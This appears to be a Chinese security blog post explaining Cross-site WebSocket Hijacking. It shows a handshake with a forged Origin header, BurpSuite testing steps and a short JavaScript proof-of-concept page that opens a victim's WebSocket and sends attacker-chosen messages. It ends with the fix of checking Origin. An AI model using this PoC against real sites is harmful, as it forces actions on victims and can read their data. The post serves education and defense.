---
layout: post
author: Vulkey_Chen
title: "浅谈WebSocket跨域劫持漏洞(CSWSH)"
date: 2019-03-20
music-id: 28661853
permalink: /archives/2019-03-20/1
description: "浅谈WebSocket跨域劫持漏洞(CSWSH)"
---

# WebSocket 跨域劫持漏洞

WebSocket 跨域劫持漏洞，英文名：**Cross-site WebSocket Hijacking**，漏洞类型：全能型CSRF（可读、可写）。

## 了解WebSocket

### Websocket 优点

1. 支持双向通信，实时性更强。
2. 更好的二进制支持。
3. 较少的控制开销。连接创建后，ws客户端、服务端进行数据交换时，协议控制的数据包头部较小。在不包含头部的情况下，服务端到客户端的包头只有2~10字节（取决于数据包长度），客户端到服务端的话，需要加上额外4字节的掩码。而HTTP协议每次通信都需要携带完整的头部。
4. 支持扩展。ws协议定义了扩展，用户可以扩展协议，或者实现自定义的子协议。（比如支持自定义压缩算法等）

### Websocket 如何建立连接

画了一张图让你了解：

![websocket](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/CSWSH/0.png)


## 漏洞产生

建立Websocket连接无验证。

### 案例

1.如下请求：

```http
GET / HTTP/1.1
Host: localhost:8080
Origin: http://127.0.0.1:3000
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: w4v7O6xFTi36lq3RNcgctw==

```

篡改Origin，发现没有对Origin进行验证，也可以跨域进行协议升级。

2.进一步验证

2.1获取到了一个发送评论的请求 （**使用BurpSuite->Proxy模块->Websockets History查看，这里是对应的 Direction值为Outgoing为发出的请求，Incoming为发出请求对应的响应信息**）

![test](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/CSWSH/1.png)

2.2使用JavaScript创建Websocket请求

**如上图所示Outgoing的内容为“我是帅key的可爱小迷弟”，那么发送的数据就是这个**。

```html
<meta charset="utf-8">
<script>
function ws_attack(){
	var ws = new WebSocket("ws://域名:端口/");//如果请求的Websocket服务仅支持HTTP就写成ws://，如果请求的Websocket服务支持HTTPs就写成wss://
	ws.onopen = function(evt) { 
		ws.send("我是帅key的可爱小迷弟！");
	};
	ws.onmessage = function(evt) {
		ws.close();
	};
}
ws_attack();
</script>
```

2.3验证发现可以请求并成功进行重放，存在Websocket跨域劫持

（这里只是简单的评论请求，危害就是：点我链接让你评论我想评论的，试想：如果是修改密码的WebSocket请求存在劫持那么问题就大了～）

## 漏洞利用

攻击流程跟以往的交互类漏洞没什么区别（点我链接读取你XXX、点我链接让你XXX）：

![attack](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/CSWSH/2.png)

来一个圈子"铸剑实战靶场"的截图，自我体会：

![success](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/CSWSH/3.png)

### PoC代码编写

```html
<meta charset="utf-8">
<script>
function ws_attack(){//自定义函数ws_attack
    //定义函数功能
    //创建WebSocket并赋值给ws变量
	var ws = new WebSocket("ws://域名:端口/");//如果请求的Websocket服务仅支持HTTP就写成ws://，如果请求的Websocket服务支持HTTPs就写成wss://
	ws.onopen = function(evt) { 
        //当ws(WebSocket)处于连接状态时执行
		ws.send("我是帅key的可爱小迷弟！");
	};
	ws.onmessage = function(evt) {
        //当ws(WebSocket)请求有响应信息时执行
        //注意：响应的信息可以通过evt.data获取！例如：alert(evt.data);
		ws.close();
	};
}
ws_attack();//执行ws_attact函数
</script>
```

## 修复方法

综合建议：校验Origin头

# Reference

https://www.cnblogs.com/chyingp/p/websocket-deep-in.html
